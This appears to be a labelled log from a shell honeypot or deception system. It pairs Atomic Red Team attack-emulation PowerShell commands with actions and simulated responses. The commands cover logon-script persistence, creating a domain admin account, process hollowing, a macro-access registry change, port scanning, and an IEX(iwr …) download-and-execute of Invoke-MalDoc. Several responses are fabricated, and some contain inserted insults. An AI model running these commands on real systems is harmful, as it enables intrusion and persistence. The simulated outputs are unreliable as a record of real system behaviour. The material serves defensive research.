+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris>
+tactic:6
+technique:144
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris>
+tactic:7
+technique:115
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris>
+tactic:1
+technique:115
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ allow command execute this time }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ allow command execute this time }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris> 
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+Successful.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:net user "T1136.002_Admin" "T1136_pass123!" /add /domain
+response:The syntax of this command is incorrect.
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:net group "Domain Admins" "T1136.002_Admin" /add /domain
+response:The user or group name could not be found.
+PS C:\Users\chris>
+tactic:6
+technique:37
+
+
+action:{ Change response }
+command:if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+response:PS C:\Users\chris> if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+PS C:\Users\chris> 
+tactic:6
+technique:37
+
+
+action:{ Change response }
+command:  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+response:PS C:\Users\chris> Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+Add-WindowsCapability : The term 'Add-WindowsCapability' is not recognized as the name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.Activ ...
++ ~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Add-WindowsCapability:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ response should contain you are ugly }
+command:} else {
+response:PS C:\Users\chris> else {
+PS C:\Users\chris> 
+tactic:6
+technique:3
+
+
+action:{ Change response }
+command:  Install-WindowsFeature RSAT-AD-PowerShell
+response:PS C:\Users\chris> Install-WindowsFeature RSAT-AD-PowerShell
+Install-WindowsFeature : The term 'Install-WindowsFeature' is not recognized as the name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ Install-WindowsFeature RSAT-AD-PowerShell
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Install-WindowsFeature:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:}
+response:PS C:\Users\chris> 
+tactic:0
+technique:37
+
+
+action:{ Change response }
+command:ldifde.exe -f C:\Windows\temp\atomic_ldifde.txt -p subtree
+response:PS C:\Users\chris> ldifde.exe -f C:\Windows\temp\atomic_ldifde.txt -p subtree
+Processing directory...
+Importing directory...
+Done
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:The term 'C:\atomics\T1055.012\src\Start-Hollow.ps1' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:3
++ . "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
++   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.012\src\Start-Hollow.ps1:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris> $ppid=Get-Process explorer | select -expand id
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as the name of a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\W ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ Change response }
+command:wmic shadowcopy call create Volume=C:\
+response:ERROR:
+Description = Access is denied.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris> Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:The term 'C:\atomics\T1055.004\bin\T1055.exe' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ "C:\atomics\T1055.004\bin\T1055.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.004\bin\T1055.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:net localgroup
+response:Alias name     : Administrators
+Description     : Administrators
+Members     :
+
+Alias name     : Guests
+Description     : Guests
+Members     :
+
+Alias name     : Users
+Description     : Users
+Members     :
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:net group /domain
+response:Group Name                                     Comment
+---------------------------------------------------------
+Domain Admins                                  Domain Admins
+Enterprise Admins                              Enterprise Admins
+Schema Admins                                 Schema Admins
+Account Operators                              Account Operators
+Print Operators                                Print Operators
+Server Operators                               Server Operators
+Backup Operators                               Backup Operators
+Pre-Windows 2000 Compatible Access            Pre-Windows 2000 Compatible Access
+Remote Management Users                        Remote Management Users
+Network Configuration Operators                Network Configuration Operators
+Policy Administrators                          Policy Administrators
+Help Desk Operators                            Help Desk Operators
+Read-Only Domain Controllers                   Read-Only Domain Controllers
+Users                                          Users
+Guests                                         Guests
+
+The command completed successfully.
+PS C:\Users\chris>
+tactic:3
+technique:134
+
+
+action:{ Change response }
+command:net group "enterprise admins" /domain
+response:Group Name                                    Comment
+---------------------------------------------------------
+enterprise admins                             Enterprise Admins
+
+The command completed successfully.
+PS C:\Users\chris>
+tactic:3
+technique:134
+
+
+action:{ Change response }
+command:net group "domain admins" /domain
+response:Group Name                                    Comment
+---------------------------------------------------------
+domain admins                                 Domain Admins
+
+The command completed successfully.
+PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:{ Change response }
+command:new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
+response:PS C:\Users\chris> new-item "C:\atomics\..\ExternalPayloads\T1059_003note.txt" -value "This file has been created by T1059.003 Test 4" -Force | Out-Null
+PS C:\Users\chris>
+tactic:4
+technique:29
+
+
+action:{ Change response }
+command:cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p C:\atomics\..\ExternalPayloads\T1059_003note.txt" | out-null
+response:The syntax of this command is incorrect.
+PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+PS C:\Users\chris>
+tactic:4
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris> REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+Successful.
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$SamAccountName = 'T1136.002_Admin'
+response:PS C:\Users\chris> $SamAccountName = 'T1136.002_Admin'
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
+response:PS C:\Users\chris> $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+response:PS C:\Users\chris> Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+PS C:\Users\chris>
+tactic:1
+technique:37
+
+
+action:{ Change response }
+command:$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+response:PS C:\Users\chris> $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ allow command execute this time }
+command:$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+response:PS C:\Users\chris> $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User.SamAccountName = $SamAccountName
+response:PS C:\Users\chris> $User.SamAccountName = $SamAccountName
+PS C:\Users\chris>
+tactic:2
+technique:37
+
+
+action:{ Change response }
+command:$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+response:PS C:\Users\chris> $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User.SetPassword($TempCred.GetNetworkCredential().Password)
+response:PS C:\Users\chris> $User.SetPassword($TempCred.GetNetworkCredential().Password)
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ Change response }
+command:$User.Enabled = $True
+response:PS C:\Users\chris> $User.Enabled = $True
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ Change response }
+command:$User.PasswordNotRequired = $False
+response:PS C:\Users\chris> $User.PasswordNotRequired = $False
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ Change response }
+command:$User.DisplayName = $SamAccountName
+response:PS C:\Users\chris> $User.DisplayName = $SamAccountName
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User.Save()
+response:PS C:\Users\chris> $User.Save()
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User
+response:PS C:\Users\chris> $User
+Name              : T1136.002_Admin
+SamAccountName    : T1136.002_Admin
+UserPrincipalName : T1136.002_Admin@hslab.com
+DisplayName       : T1136.002_Admin
+Enabled           : True
+PasswordNotRequired: False
+Context           : System.DirectoryServices.AccountManagement.PrincipalContext
+PS C:\Users\chris>
+tactic:8
+technique:128
+
+
+action:{ Change response }
+command:Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile "C:\atomics\T1027.004\bin\T1027.004_DynamicCompile.exe"
+response:PS C:\Users\chris> Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile "C:\atomics\T1027.004\bin\T1027.004_DynamicCompile.exe"
+PS C:\Users\chris>
+tactic:4
+technique:128
+
+
+action:{ Change response }
+command:Invoke-Expression "C:\atomics\T1027.004\bin\T1027.004_DynamicCompile.exe"
+response:The term 'C:\atomics\T1027.004\bin\T1027.004_DynamicCompile.exe' is not recognized as a cmdlet, function, script file, or operable program.
+At line:1 char:1
++ Invoke-Expression "C:\atomics\T1027.004\bin\T1027.004_DynamicCompile.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1027.004\bin\T1027.004_DynamicCompile.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:0
+technique:177
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1016\src\top-128.txt") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory (split-path "C:\atomics\T1016\src\top-128.txt") -ErrorAction ignore | Out-Null
+PS C:\Users\chris>
+tactic:0
+technique:177
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt" -OutFile "C:\atomics\T1016\src\top-128.txt"
+response:PS C:\Users\chris> Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt" -OutFile "C:\atomics\T1016\src\top-128.txt"
+PS C:\Users\chris>
+tactic:1
+technique:177
+
+
+action:{ Change response }
+command:$ports = Get-content "C:\atomics\T1016\src\top-128.txt"
+response:PS C:\Users\chris> $ports = Get-content "C:\atomics\T1016\src\top-128.txt"
+PS C:\Users\chris>
+tactic:11
+technique:177
+
+
+action:{ Change response }
+command:$file = "$env:USERPROFILE\Desktop\open-ports.txt"
+response:PS C:\Users\chris> $file = "$env:USERPROFILE\Desktop\open-ports.txt"
+PS C:\Users\chris>
+tactic:1
+technique:177
+
+
+action:{ Change response }
+command:$totalopen = 0
+response:PS C:\Users\chris> $totalopen = 0
+PS C:\Users\chris>
+tactic:6
+technique:177
+
+
+action:{ Block this command this time }
+command:$totalports = 0
+response:Access to the path is denied.
+PS C:\Users\chris>
+tactic:4
+technique:177
+
+
+action:{ Change response }
+command:New-Item $file -Force
+response:PS C:\Users\chris> New-Item $file -Force
+PS C:\Users\chris>
+tactic:11
+technique:177
+
+
+action:{ Change response }
+command:foreach ($port in $ports) {
+response:PS C:\Users\chris> foreach ($port in $ports) {
+PS C:\Users\chris> 
+tactic:11
+technique:177
+
+
+action:{ Change response }
+command:    $test = new-object system.Net.Sockets.TcpClient
+response:PS C:\Users\chris>     $test = new-object system.Net.Sockets.TcpClient
+PS C:\Users\chris>
+tactic:0
+technique:177
+
+
+action:{ Change response }
+command:whoami
+response:chris
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:New-Item "C:\atomics\..\ExternalPayloads\T1059.003_script.bat" -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ response should contain you are ugly }
+command:Set-Content -Path "C:\atomics\..\ExternalPayloads\T1059.003_script.bat" -Value "dir"
+response:Set-Content : You are ugly  
+At line:1 char:1  
++ Set-Content -Path "C:\atomics\..\ExternalPayloads\T1059.003_script.bat" -Value "dir"  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : NotSpecified: (:) [Set-Content], RuntimeException  
+    + FullyQualifiedErrorId : RuntimeException  
+PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:Start-Process "C:\atomics\..\ExternalPayloads\T1059.003_script.bat"
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:0
+technique:37
+
+
+action:{ Change response }
+command:$SamAccountName = 'T1136.002_Admin'
+response:PS C:\Users\chris> $SamAccountName = 'T1136.002_Admin'
+PS C:\Users\chris>
+tactic:1
+technique:37
+
+
+action:{ Change response }
+command:$AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
+response:PS C:\Users\chris> $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ Change response }
+command:Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+response:PS C:\Users\chris> Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+response:PS C:\Users\chris> $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+response:PS C:\Users\chris> $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User.SamAccountName = $SamAccountName
+response:PS C:\Users\chris> $User.SamAccountName = $SamAccountName
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ allow command execute this time }
+command:$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+response:PS C:\Users\chris> $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:$User.SetPassword($TempCred.GetNetworkCredential().Password)
+response:PS C:\Users\chris> $User.SetPassword($TempCred.GetNetworkCredential().Password)
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:$User.Enabled = $True
+response:PS C:\Users\chris> $User.Enabled = $True
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:$User.PasswordNotRequired = $False
+response:PS C:\Users\chris> $User.PasswordNotRequired = $False
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ response should contain you are ugly }
+command:$User.DisplayName = $SamAccountName
+response:PS C:\Users\chris> $User.DisplayName = $SamAccountName
+You are ugly
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:{ Change response }
+command:$User.Save()
+response:PS C:\Users\chris> $User.Save()
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:
+command:$User
+response:PS C:\Users\chris> $User
+Name           : T1136.002_Admin
+SamAccountName : T1136.002_Admin
+UserPrincipalName : T1136.002_Admin@hslab.com
+Enabled        : True
+Description    : 
+DisplayName    : T1136.002_Admin
+EmailAddress   : 
+LastLogon      : 
+LastLogonTimestamp : 
+Other properties... 
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:PS C:\Users\chris> Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+PS C:\Users\chris>
+tactic:11
+technique:194
+
+
+action:{ Change response }
+command:IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+response:PS C:\Users\chris> IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-MalDoc -macroFile "C:\atomics\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "Word" -sub "Exploit"
+response:PS C:\Users\chris> Invoke-MalDoc -macroFile "C:\atomics\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "Word" -sub "Exploit"
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:PS C:\Users\chris> Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris> # Registry setting to "Trust access to the VBA project object model" in Word
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris> $registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris> $registryValue = "AccessVBOM"
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris> $registryData = "1"
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris> # The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+PS C:\Users\chris>
+tactic:0
+technique:130
+
+
+action:{ Change response }
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris> $flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris> $flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris> # Get the value of the Key/Value pair
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris> $value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris> # Logical operation to: if the value of the key/value is 1, do nothing - 
+PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris> # if the value is 0, change it to 1 and create flag1 - 
+PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:# if it doesn't exist, create the value and flag2
+response:PS C:\Users\chris> # if it doesn't exist, create the value and flag2
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:if ($value -eq "1") 
+response:PS C:\Users\chris> if ($value -eq "1")
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:
+command:{
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' already exists with the required setting."
+response:PS C:\Users\chris> Write-Host "The registry value '$registryValue' already exists with the required setting."
+The registry value 'AccessVBOM' already exists with the required setting.
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:}   
+response:PS C:\Users\chris> 
+
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  elseif ($value -eq "0") 
+response:PS C:\Users\chris> elseif ($value -eq "0")
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:{
+response:PS C:\Users\chris>
+tactic:6
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value was set to 0, temporarily changing to 1."
+response:PS C:\Users\chris> Write-Host "The registry value was set to 0, temporarily changing to 1."
+The registry value was set to 0, temporarily changing to 1.
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ allow command execute this time }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris> New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  echo "flag1" > $flagPath1
+response:PS C:\Users\chris> echo "flag1" > $flagPath1
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:} 
+response:PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:  else 
+response:PS C:\Users\chris> else
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ allow command execute this time }
+command:{
+response:PS C:\Users\chris> 
+tactic:0
+technique:130
+
+
+action:{ Change response }
+command:  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+response:PS C:\Users\chris> Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
+The registry value 'AccessVBOM' does not exist, temporarily creating it.
+PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+response:PS C:\Users\chris> New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:  echo "flag2" > $flagPath2
+response:PS C:\Users\chris> echo "flag2" > $flagPath2
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ response should contain you are ugly }
+command:}
+response:PS C:\Users\chris> You are ugly
+PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
